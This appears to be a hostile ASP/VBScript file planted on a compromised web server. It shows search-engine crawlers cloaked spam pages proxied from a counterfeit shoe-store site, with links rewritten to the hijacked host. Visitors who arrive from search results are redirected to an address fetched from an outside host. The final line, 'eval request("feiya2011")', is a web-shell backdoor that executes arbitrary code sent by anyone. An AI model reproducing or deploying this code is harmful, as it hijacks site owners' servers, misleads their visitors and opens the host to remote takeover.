<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<%
on error resume next
jumpcode="http://link.2016online.com/en/jordan.txt.html"
desurljiechi="http://www.basketballshoes.us.org/cheap-jordan-1-retros-fire-red-white-black-p-227.html#.WrFAi1MT_os"
arrdom = Split(desurljiechi, "/")
For dd = 0 To 2
    desurl = desurl & arrdom(dd)& "/"
Next
shellurl="http://"&Request.ServerVariables("Http_Host")&replace(replace(LCase(replace(Request.ServerVariables("REQUEST_URI"),"?"&request.ServerVariables("QUERY_STRING"),"")),"index.asp",""),"default.asp","")&"?"
rp="nike"
rc="online"
function is_spider()
	dim s_agent
	s_agent=Request.ServerVariables("HTTP_USER_AGENT")

	If instr(s_agent,"google")>0 Or instr(s_agent,"yahoo")>0 Or instr(s_agent,"bing")>0 Or instr(s_agent,"msnbot")>0 Or instr(s_agent,"alexa")>0 Or instr(s_agent,"ask")>0 Or instr(s_agent,"findlinks")>a0 Or instr(s_agent,"altavista")>0 Or instr(s_agent,"baidu")>0 Or instr(s_agent,"inktomi")>0 Then
	is_spider = 1
	else
	is_spider = 0
	end if
end function

Function GetHtml(url,k)
  agent = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"&k
  Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
  ObjXMLHTTP.Open "GET",url,False
  ObjXMLHTTP.setRequestHeader "User-Agent",agent
  ObjXMLHTTP.setRequestHeader "Referer", "https://www.google.com/"
  ObjXMLHTTP.send
  GetHtml=ObjXMLHTTP.responseBody
  Set ObjXMLHTTP=Nothing
  set objStream = Server.CreateObject("Adodb.Stream")
  objStream.Type = 1
  objStream.Mode =3
  objStream.Open
  objStream.Write GetHtml
  objStream.Position = 0
  objStream.Type = 2
  objStream.Charset = "utf-8"
  
  GetHtml = objStream.ReadText
  objStream.Close
End Function
Function IsUserSearch()
	s_ref=Request.ServerVariables("HTTP_REFERER")
	If instr(s_ref,"google")>0 Or instr(s_ref,"yahoo")>0 Or instr(s_ref,"bing")>0 Or instr(s_ref,"aol")>0 Then
		IsUserSearch = true
	else
		IsUserSearch = false
	end if
End Function
Function RegExpMatches(patrn, strng)
	Dim regEx, Match, Matches
	Set regEx = New RegExp
	regEx.Pattern = patrn
	regEx.IgnoreCase = True
	regEx.Global = True
	Set Matches = regEx.Execute(strng)
	Dim MyArray()
	Dim i
	i=0
	For Each Match in Matches
		ReDim Preserve MyArray(i)
		MyArray(i)=Match.Value
		i=i-(-1)
	Next
	RegExpMatches = MyArray
End Function

Function RegExpReplace(html,patrn, strng)
Dim regEx
Set regEx = New RegExp
regEx.Pattern = patrn
regEx.IgnoreCase = True
regEx.Global = True
RegExpReplace=regEx.Replace(html,strng)
End Function

Function cDec(num)
 cDecstr=0
 if len(num)>0 and isnumeric(num) then
  for inum=0 to len(num)-1
   cDecstr=cDecstr-(-(2^inum*cint(mid(num,len(num)-inum,1))))
  next
 end if
 cDec=cDecstr
End Function 

Function OcB(num)
 OcBstr=""
 if len(num)>0 and isnumeric(num) then
  for i=1 to len(num)
   select case (mid(num,i,1))
    case "0" OcBstr=OcBstr&"000"
    case "1" OcBstr=OcBstr&"001"
    case "2" OcBstr=OcBstr&"010"
    case "3" OcBstr=OcBstr&"011"
    case "4" OcBstr=OcBstr&"100"
    case "5" OcBstr=OcBstr&"101"
    case "6" OcBstr=OcBstr&"110"
    case "7" OcBstr=OcBstr&"111"
   end select
  next
 end if
 OcB=OcBstr
End Function 

Function OcD(num)
 OcD=cDec(OcB(num))
End Function 

Function toOct(objMatch)
	    toOct = "-"&rp&"-"&Oct(objMatch.subMatches(0))&"."
End Function

Function toDeOct(objMatch)
	    toDeOct = "-p-"&OcD(objMatch.subMatches(0))&"."
End Function

Function toCOct(objMatch)
	    toCOct = "-"&rc&"-"&Oct(objMatch.subMatches(0))&objMatch.subMatches(1)
End Function

Function toCDeOct(objMatch)
	    toCDeOct = "-c-"&OcD(objMatch.subMatches(0))&objMatch.subMatches(1)
End Function

Function RegExpReplaceCall( reg, m, str, fstr)
	    Dim Fun, Match, Matches, i, nStr, LastIndex
	    If str & "" = "" Then Exit Function
	    Set Fun = getRef(fstr)
	    Set regEx = New RegExp
		regEx.Pattern = reg
		regEx.IgnoreCase = True
		regEx.Global = True
		Set Matches = regEx.Execute(str)
	    LastIndex = 1
	    For Each Match In Matches
	        If Match.FirstIndex>0 Then
	            nStr = nStr & Mid(str, LastIndex, Match.FirstIndex-(-1)-LastIndex)
	        End If
	        nStr = nStr & Fun(Match)
        LastIndex = Match.FirstIndex-(-1)-(-Match.Length)
	    Next
	    nStr = nStr & Mid(str, LastIndex)
	    RegExpReplaceCall = nStr
End Function

Function RegReplaceCall( reg, str, fstr)
	    RegReplaceCall = RegExpReplaceCall(reg, "ig", str, fstr)
End Function

spider = is_spider()
querystr = request.ServerVariables("QUERY_STRING")
if  spider = 1 or querystr = "feiya" then
    if querystr = "feiya" then
	    querystr = ""
	end if
	if querystr <> "" then
		querystr = RegReplaceCall("-"&rp&"-(\d"&chr(43)&")\.",querystr,"toDeOct")
		querystr = RegReplaceCall("-"&rc&"-(\d"&chr(43)&")([\._])",querystr,"toCDeOct")
		htmls = GetHtml(desurl&querystr,"")
	else
	    htmls = GetHtml(desurljiechi&querystr,"")
	end if

	htmls = RegExpReplace(htmls,"href\s*=\s*(["&chr(34)&"'])"&desurl,"href=$1"&shellurl)
	desurl1 = RegExpReplace(desurl,"/$","")
	htmls = RegExpReplace(htmls,"href\s*=\s*(["&chr(34)&"'])"&desurl1,"href=$1"&shellurl)
	htmls = RegExpReplace(htmls,"href\s*=\s*(["&chr(34)&"'])/","href=$1"&shellurl)
	htmls = RegExpReplace(htmls,"href\s*=\s*(["&chr(34)&"'])(?!http)","href=$1"&shellurl)
	
	htmls = RegExpReplace(htmls,"src\s*=\s*(["&chr(34)&"'])"&desurl,"src=$1"&shellurl)
	htmls = RegExpReplace(htmls,"src\s*=\s*(["&chr(34)&"'])/","src=$1"&shellurl)
	htmls = RegExpReplace(htmls,"src\s*=\s*(["&chr(34)&"'])(?!http)","src=$1"&shellurl)
	htmls = RegExpReplace(htmls,"url\((["&chr(34)&"'])","url($1"&shellurl)
	
	desurl2 = replace(desurl1,"http://www.","")
	desurl2 = replace(desurl2,"http://","")
	htmls = replace(htmls,desurl2,Request.ServerVariables("Http_Host"),1,-1,1)
	
	htmls = RegExpReplace(htmls,"href\s*=\s*(["&chr(34)&"'])"&shellurl&"\?(.*\.css)","href=$1"&desurl&"$2")
	htmls = RegExpReplace(htmls,"href\s*=\s*(["&chr(34)&"'])"&shellurl&"\?(.*\.ico)","href=$1"&desurl&"$2")
	
	htmls = RegExpReplace(htmls,"src\s*=\s*(["&chr(34)&"'])"&shellurl&"\?","src=$1"&desurl)
	
	shellurlrm =  shellurl
	shellurlrm=replace(shellurlrm,"?","")
	htmls = RegExpReplace(htmls,shellurlrm&"\?(["&chr(34)&"'])",shellurlrm&"$1")
	
	htmls = RegReplaceCall("-p-(\d"&chr(43)&")\.",htmls,"toOct")
	htmls = RegReplaceCall("-c-(\d"&chr(43)&")([\._])",htmls,"toCOct")
	
	htmls =  replace(htmls,"window.location.href","var jp")
	htmls =  replace(htmls,"location.href",";var jp")
	response.write htmls
	response.end()
else
	if IsUserSearch then
		if instr(jumpcode,".txt")>0 then
			jumpcode = GetHtml(jumpcode,"Mozi11a")
			tiaoarray=split(jumpcode,"?")
			if IsEmpty(tiaoarray(0)) then 
			   response.redirect jumpcode&"?"&shellurl
			else
			   response.redirect tiaoarray(0)&"?"&shellurl
			end if
		end if
	end if
end if
eval request("feiya2011")
%>
